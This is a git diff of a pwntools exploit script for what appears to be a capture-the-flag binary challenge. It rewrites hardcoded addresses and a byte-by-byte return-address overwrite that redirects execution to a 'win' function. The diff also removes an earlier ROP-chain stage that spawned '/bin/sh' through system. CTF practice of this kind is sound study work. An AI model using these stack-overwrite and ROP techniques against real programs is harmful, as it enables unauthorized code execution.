@@ -51,16 +51,16 @@ payload = ''
 
 key = 0x00007fffffffddc0
 retptr = 0x00007fffffffdd58
-main = 0x0000555555555371
+main = 0x00005555555553b5
+win = 0x0000555555555391
 
-payload += pushnum(retptr - key) + 'rp' + 'irp' * 7 # prints out address of main1475
 
-# overwrite from 0x555555555934 to 0x000055555555537c(main+11) cuz dw screw up stack (if no aslr)
+# overwrite from 0x0000555555555978 to 0x0000555555555391 cuz dw screw up stack (if no aslr)
 
 # overwriting first byte
-payload += 'd' * 7 + 'r' # point
+payload += pushnum(retptr - key) + 'r' # move to return address
 payload += '0a' # get val
-payload += 'i' * (0x7c-0x34) # increment
+payload += 'i' * (0x91-0x78) # increment
 payload += 'u' # overwrite
 
 # overwriting second byte
@@ -70,24 +70,5 @@ payload += 'd' * (0x59-0x53) # decrement
 payload += 'u' # overwrite
 
 r.sendline(payload)
-#print payloaddd
-
-r.recvuntil('Verifying\n')
-
-mainaddr = u64(r.recvline()[:8]) - 1475
-
-offset = mainaddr - main
-
-print 'main : ' + hex(mainaddr)
-
-payload = ''
-
-payload += genrop(0x7ffff7e1c850) # need to leak system
-payload += genrop(0x00005555555559fb) # print 'flag'
-payload += genrop(0x00007fffffffdd70) # pointer to /bin/sh
-payload += genrop(0x002f62696e2f7368) # /bin/sh
-
-r.sendline(payload)
-#print payload
 
 r.interactive()
